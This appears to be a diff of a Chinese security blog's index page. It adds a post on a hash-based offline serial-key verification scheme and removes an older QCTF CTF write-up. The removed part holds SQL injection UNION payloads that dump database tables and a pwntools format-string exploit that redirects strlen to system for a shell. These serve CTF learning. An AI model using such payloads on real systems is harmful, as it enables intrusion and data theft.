@@ -67,6 +67,67 @@
       <div id="main" class="wrapper">
         <div id="primary" class="site-content"><div id="content" role="main">
   
+    <article id="post-“绝对安全”的本地序列号验证方法" class="post-“绝对安全”的本地序列号验证方法 post type-post status-publish format-standard hentry">
+    <!---->
+
+      <header class="entry-header">
+        
+        
+  
+    <h1 class="entry-title">
+      <a class="article-title" href="/2019/12/14/“绝对安全”的本地序列号验证方法/">“绝对安全”的本地序列号验证方法</a>
+    </h1>
+  
+
+        
+        <div class="comments-link">
+            
+            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2019/12/14/“绝对安全”的本地序列号验证方法/" data-id="ck45e40ca001fkk3k1izzaou1" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+        </div><!-- .comments-link -->
+      </header><!-- .entry-header -->
+
+    <div class="entry-content">
+      
+        <h2 id="一种“绝对安全”的序列号验证方法"><a href="#一种“绝对安全”的序列号验证方法" class="headerlink" title="一种“绝对安全”的序列号验证方法"></a>一种“绝对安全”的序列号验证方法</h2><p>声明：</p>
+<p>​    所谓的“绝对安全”:只是在自己目前的知识范围内认为其“绝对安全”(其实也不是QAQ)，天下逆向破解大神何其之多，这种验证方法也只是分享出来，供大家学习交流。</p>
+<p>从逆向系统序列号学到的一种“绝对安全”的本地序列号验证方法，不需要联网验证只需要本地，即可实现攻击者“无法破解”，使得序列号只能由开发者提供。下面介绍一下这种序列号验证的代码思想，有以下四个步骤(顺序不固定)：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>使用单向hash算法作为验证的核心，比如sha512：</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(sha512(checkBytes) == 硬编码的哈希值):</span><br><span class="line">	subKey = checkBytes</span><br><span class="line"></span><br><span class="line">其中checkBytes应为大于等于<span class="number">8</span>字节的字节串，每个字节取值范围<span class="number">0</span><span class="number">-255</span>，一般由其他算法得到。</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>获取一些固定信息(如本计算机MAC地址)或者其他用户的输入(比如UserName),使用算法变换得到一组数据tmpData。</span><br><span class="line">举例：</span><br><span class="line">取sha512(The MAC Address of Computer)结果的<span class="number">16</span>/<span class="number">32</span>/etc字节作为流密码的密钥，流密码的输入可以固定，得到一组输出streamCipher</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>输入序列号变换算法随意，假定变换后得到的输出为serialNumber,checkBytes的来源如下：</span><br><span class="line"></span><br><span class="line">checkBytes = serialNumber ^ streamCipher</span><br><span class="line"></span><br><span class="line">将serialNumber和streamCipher进行变换得到checkBytes，例子中使用一个简单的异或算法，也没有任何问题。</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span>经过上面三个步骤的，攻击者可能可以强制跳转绕过哈希算法的校验，下面最最最关键的核心部分来了，在哈希校验通过以后，checkBytes赋值给了subKey，在程序的某处运用subKey进行如下操作：</span><br><span class="line"></span><br><span class="line">decryptFinalKey = sha512(subKey + <span class="string">"00 00 00 01"</span>)</span><br><span class="line"></span><br><span class="line">decryptFinalKey可以根据自己的喜好，取decryptFinalKey中的<span class="number">16</span>/<span class="number">32</span>/<span class="number">48</span>/<span class="number">64</span>字节，解密校验的<span class="string">"最终的数据"</span>，<span class="string">"最终的数据"</span>可以是安装系统中最后加载的文件系统，也可以是软件序列号最终的校验代码，也可以是软件进行安装的安装代码等等。试想一下，如果攻击者强制通过哈希算法校验，那么其在这一步必然无法正确解密<span class="string">"最终的数据"</span>，前面逆向分析的成果都将无用，化作泡影。</span><br></pre></td></tr></table></figure>
+<p>以上四个步骤按照开发顺序一般是先2，3(3，2)，后1，4。每个步骤使用的算法自定，只要校验的核心思想没有产生变化，大概都是”无法破解”的吧，且确实符合一个UserName对应一个序列号这种序列号验证的基本思想。</p>
+<p>但是存在的问题还是有的，即如果攻击者买了一个序列号，那么不管序列号经过如何复杂的混淆，变换，加解密，解编码得到serialNumber，攻击者都可以通过调试得到serialNumber，而streamCipher的变换输入来源攻击者也是知道的(比如UserName)，那么攻击者即可通过调试获得checkBytes的正确值，程序自然也就破解了。</p>
+<p>解决办法：</p>
+<p>1.不断加强校验步骤中的混淆算法，逆向过程会让人十分头疼，将劝退一部分逆向人员。</p>
+<p>2.不断加强保护技术，包括但不限于虚拟机技术，反调试技术，混淆代码技术，新的壳算法等待，或者这些方法的混合使用，将劝退大部分逆向人员。</p>
+<p>但就算是这样，每年最新的游戏不还是照样被国外大神们破解了么(吐槽)。。。攻防之间，攻击者与防御者相互促进相互学习，可能这就是安全的独特魅力吧！</p>
+<p>​</p>
+
+      
+    </div><!-- .entry-content -->
+
+    <footer class="entry-meta">
+    <a href="/2019/12/14/“绝对安全”的本地序列号验证方法/">
+    <time datetime="2019-12-14T09:37:38.000Z" class="entry-date">
+        2019-12-14
+    </time>
+</a>
+    
+  <span class="article-delim">&#8226;</span>
+  <div class="article-category">
+  <a class="article-category-link" href="/categories/others/">others</a>
+  </div>
+
+    
+  <span class="article-delim">&#8226;</span>
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/reverse/">reverse</a></li></ul>
+
+    </footer>
+</article>
+
+
+
+
+
+
+  
     <article id="post-C++逆向随笔" class="post-C++逆向随笔 post type-post status-publish format-standard hentry">
     <!---->
 
@@ -82,7 +143,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2019/12/07/C++逆向随笔/" data-id="ck3vphnay002rry3k3r8oal92" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2019/12/07/C++逆向随笔/" data-id="ck45e40d4002bkk3krmkzok2c" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -169,7 +230,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2019/08/24/某游戏cg素材解包/" data-id="ck3vphn91001pry3ky2i9sqdq" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2019/08/24/某游戏cg素材解包/" data-id="ck45e40ce001skk3k1y53izm4" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -239,7 +300,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2019/05/31/打包小工具/" data-id="ck3vphnax002pry3ktxbo18gy" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2019/05/31/打包小工具/" data-id="ck45e40dk002vkk3kzj9y9llx" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -292,7 +353,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2018/10/09/绕过某摄像头校验机制软刷固件/" data-id="ck3vphn94001sry3knyrpywn7" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2018/10/09/绕过某摄像头校验机制软刷固件/" data-id="ck45e40cg001vkk3k8wtmzmxk" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -367,7 +428,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2018/10/09/pwn-unlink/" data-id="ck3vphn8l000yry3k6zg7a3jz" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2018/10/09/pwn-unlink/" data-id="ck45e40c3000xkk3kyz3wf8wt" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -434,7 +495,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2018/10/09/pwn-house-of-spirit/" data-id="ck3vphn8i000try3ktjs6z220" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2018/10/09/pwn-house-of-spirit/" data-id="ck45e40c1000tkk3k5ojro9zn" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -492,7 +553,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2018/10/09/pwn-extend/" data-id="ck3vphn8g000rry3k4n7xoff3" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2018/10/09/pwn-extend/" data-id="ck45e40bz000rkk3kq5dthfhl" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -545,7 +606,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2018/08/23/CS1-6-透视分析/" data-id="ck3vphn7i0003ry3kclng8yea" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2018/08/23/CS1-6-透视分析/" data-id="ck45e40b60000kk3kqhtr8k4l" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -609,7 +670,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2018/08/12/Cheat-Engine/" data-id="ck3vphn790000ry3kmn6eyyiy" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2018/08/12/Cheat-Engine/" data-id="ck45e40ba0001kk3k8icubufy" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -665,78 +726,10 @@
 
 
   
-    <article id="post-QCTF-xman" class="post-QCTF-xman post type-post status-publish format-standard hentry">
-    <!---->
-
-      <header class="entry-header">
-        
-        
-  
-    <h1 class="entry-title">
-      <a class="article-title" href="/2018/07/16/QCTF-xman/">QCTF-xman</a>
-    </h1>
-  
-
-        
-        <div class="comments-link">
-            
-            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2018/07/16/QCTF-xman/" data-id="ck3vphn84000ery3kqey056jx" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
-        </div><!-- .comments-link -->
-      </header><!-- .entry-header -->
-
-    <div class="entry-content">
-      
-        <p>周末试着尝试了一下QCTF-xman选拔赛的web题目和pwn题，萌新记录一下学习到的东西，毕竟还没入门的我是真的菜！</p>
-<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="NewsCenter"><a href="#NewsCenter" class="headerlink" title="NewsCenter"></a>NewsCenter</h3><p>emmmmm，第一次做web题目，用AWVS扫了一下，发现有sql注入漏洞，网页上仅有Search一个注入点，于是乎，开始学习如何进行sql注入。出现漏洞的网页是.php，后台服务器是appache，是个MySql的数据库。上网搜索到了如何查MySql数据库的库名，表名，字段名，由于第一次做web，还是需要记录一下操作过程的，网页没有过滤任何字符：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">' union SELECT 1,2,schema_name FROM information_schema.SCHEMATA</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'</span> union SELECT 1,table_schema,table_name FROM information_schema.tables <span class="built_in">where</span> table_schema=<span class="string">"news"</span> <span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="string">' union SELECT table_name,column_name,data_type FROM information_schema.columns where table_name="secret_table" #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'</span> union SELECT 1,id,fl4g FROM news.secret_table <span class="comment">#</span></span><br></pre></td></tr></table></figure>
-<p>即可得到flag:QCTF{sq1_inJec7ion_ezzzzzz}</p>
-<h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="notebook"><a href="#notebook" class="headerlink" title="notebook"></a>notebook</h3><p>第一次做格式化字符串漏洞，可以说还是踩了不少坑。<br>程序流程：</p>
-<ol>
-<li>sprintf输入到另外一个buffer中，对长度进行了校验。</li>
-<li>printf(buffer)</li>
-</ol>
-<p>对于1中，需要知道两个”%%”在sprintf以后会成为一个”%”，对于%%n$hhn在sprintf以后就能恢复为%n$hhn，减少的%个数，可以通过在构造的输入末尾加上相应长度的字符串绕过长度校验，比如在最后加上%nc。</p>
-<p>对于2中，需要知道格式化字符串漏洞的基本原理以及利用方式，主要有以下几点是格式化字符串中常用的方法和点：</p>
-<ol>
-<li>%n,%hn,%hhn 改写4字节，2字节，1字节</li>
-<li>%n$ 选中printf类函数的第n+1个参数</li>
-<li>通常以下构造格式较为通用：[打印字符数量]+[改写位置]+address</li>
-<li>确定改写首位置：找到调用printf类函数时，改写首位置n = 当前栈顶与buffer之间的距离/4</li>
-</ol>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 更正思路,修改strlen函数got表-&gt;system，输入/bin/sh，直接调用</span></span><br><span class="line"><span class="comment"># 0x0804A038 -&gt; 080485C0</span></span><br><span class="line"><span class="comment"># payload1 = p32(0x0804A03A)+"%%14$hhn%%4c%%20$hhn"+p32(0x0804A03B)+"22%%119c%%25$hhn"+p32(0x0804A039)+"%%55c%%30$hhn222"+p32(0x0804A038)+"%11c"</span></span><br><span class="line"><span class="comment"># payload2 = "2222"+"%%17$hhn"+p32(0x0804A03A)+"%%20$hhn"+p32(0x0804A03B)+"%%119c"+"22"+"%%25$hhn"+p32(0x0804A039)+"222"+"%%52c"+"%%30$hhn"+p32(0x0804A038)+"%10c"</span></span><br><span class="line"><span class="comment"># QCTF&#123;f0rmat_s7r1ng_is_happy_&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwnIt</span><span class="params">()</span>:</span></span><br><span class="line">	p = process(<span class="string">"./notebook"</span>)</span><br><span class="line"><span class="comment">#	gdb.attach(p)</span></span><br><span class="line">	p.recvuntil(<span class="string">"May I have your name?\n"</span>)</span><br><span class="line">	payload = p32(<span class="number">0x0804A03A</span>)+<span class="string">"%%14$hhn%%4c%%20$hhn"</span>+p32(<span class="number">0x0804A03B</span>)+<span class="string">"22%%119c%%25$hhn"</span>+p32(<span class="number">0x0804A039</span>)+<span class="string">"%%55c%%30$hhn222"</span>+p32(<span class="number">0x0804A038</span>)+<span class="string">"%11c"</span>			p.sendline(payload)</span><br><span class="line">	p.recvuntil(<span class="string">"on the notebook?\n"</span>)</span><br><span class="line">	p.sendline(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">	p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">	pwnIt()</span><br></pre></td></tr></table></figure>
-
-      
-    </div><!-- .entry-content -->
-
-    <footer class="entry-meta">
-    <a href="/2018/07/16/QCTF-xman/">
-    <time datetime="2018-07-16T07:20:34.000Z" class="entry-date">
-        2018-07-16
-    </time>
-</a>
-    
-  <span class="article-delim">&#8226;</span>
-  <div class="article-category">
-  <a class="article-category-link" href="/categories/CTF/">CTF</a>
-  </div>
-
-    
-  <span class="article-delim">&#8226;</span>
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/">web</a></li></ul>
-
-    </footer>
-</article>
-
-
-
-
-
-
-  
   
     <nav id="pagination">
       <nav id="page-nav">
-        <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
+        <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
       </nav>
     </nav>
   
@@ -757,7 +750,7 @@
   <aside class="widget">
     <h3 class="widget-title">Categories</h3>
     <div class="widget-content">
-      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a><span class="category-list-count">11</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/GameSecurity/">GameSecurity</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/IOT/">IOT</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Tools/">Tools</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/others/">others</a><span class="category-list-count">9</span></li></ul>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a><span class="category-list-count">11</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/GameSecurity/">GameSecurity</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/IOT/">IOT</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Tools/">Tools</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/others/">others</a><span class="category-list-count">10</span></li></ul>
     </div>
   </aside>
 
@@ -767,6 +760,10 @@
     <h3 class="widget-title">Recents</h3>
     <div class="widget-content">
       <ul>
+        
+          <li>
+            <a href="/2019/12/14/“绝对安全”的本地序列号验证方法/">“绝对安全”的本地序列号验证方法</a>
+          </li>
         
           <li>
             <a href="/2019/12/07/C++逆向随笔/">C++逆向随笔</a>
@@ -784,10 +781,6 @@
             <a href="/2018/10/09/绕过某摄像头校验机制软刷固件/">绕过某摄像头校验机制软刷固件</a>
           </li>
         
-          <li>
-            <a href="/2018/10/09/pwn-unlink/">pwn-unlink</a>
-          </li>
-        
       </ul>
     </div>
   </aside>
@@ -797,7 +790,7 @@
   <aside class="widget">
     <h3 class="widget-title">Tags</h3>
     <div class="widget-content">
-      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/PE/">PE</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/firmware/">firmware</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/">pwn</a><span class="tag-list-count">5</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/reverse/">reverse</a><span class="tag-list-count">16</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/">web</a><span class="tag-list-count">1</span></li></ul>
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/PE/">PE</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/firmware/">firmware</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/">pwn</a><span class="tag-list-count">5</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/reverse/">reverse</a><span class="tag-list-count">17</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/">web</a><span class="tag-list-count">1</span></li></ul>
     </div>
   </aside>
 
